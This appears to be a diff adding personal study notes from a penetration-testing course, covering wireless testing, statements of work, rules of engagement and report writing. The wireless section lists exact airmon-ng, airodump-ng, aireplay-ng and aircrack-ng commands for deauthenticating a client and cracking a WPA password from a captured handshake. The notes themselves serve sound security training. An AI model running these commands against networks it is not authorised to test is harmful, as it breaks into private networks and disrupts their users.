@@ -4358,5 +4358,75 @@ OWASP A10-Insufficient Logging & Monitoring: https://owasp.org/www-project-top-t
 ## Wireless Penetration Testing
 
 
-### 001 Wireless Penetration Testing Overview
+### Wireless Penetration Testing Overview
+
+![[Pasted image 20230409093752.png]]
+
+![[Pasted image 20230409094545.png]]
+
+![[Pasted image 20230409094835.png]]
+
+
+### WPA-PS2 Exploit Walkthrough
+
+> [!todo] 
+>  `iwconfig`
+>  `sudo airmon-ng check kill`
+>  `sudo airmon-ng start wlan0`
+>  `iwconfig`
+>  `sudo airodump-ng wlan0`
+>  
+
+![[Pasted image 20230409131410.png]]
+
+> [!todo] 
+>  `sudo airodump-ng -c 1 --bssid 30:xx:xx:xx:xx:xx -w capture wlan0`
+>  `sudo aireplay-ng -0 1 -a  <STATION MAC Address> wlan0` - Station Deauth
+>  `sudo aircrack-ng -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt -b 30:D3:2D:E2:4A:B2 capture-02.cap` - Crack Password
+
+
+## Legal Documents and Report Writing
+
+### Common Legal Documents
+
+![[Pasted image 20230409103355.png]]
+
+![[Pasted image 20230409103719.png]]
+
+> [!info] 
+>   A Statement of Work (SOW) is a specific contract for a client. 
+>   - Timeline / Deathline
+>   - What to deliver
+>   - Costs
+
+> [!info] 
+ Rules of Engagement (ROE):
+> - What you can do
+> - What you can't do
+> - No social engineering 
+> - No denial of service
+
+> [!warning] 
+>  You can't start testing until you have a **Rules of Engagement** signed by the customer!
+
+
+### Pentest Report Writing
+
+> [!note] 
+> Resources for this video:
+> Sample Pentest Report: [https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report](https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report) 
+
+
+### Reviewing a Real Pentest Report
+
+> [!info] 
+> Sample Report:
+> https://tcm-sec.com/wp-content/uploads/2021/10/TCMS-Demo-Corp-Security-Assessment-Findings-Report.pdf
+>  
+![[Pasted image 20230409113243.png]]
+
+
+## Career Advice
+
+![[Pasted image 20230409115604.png]]
 
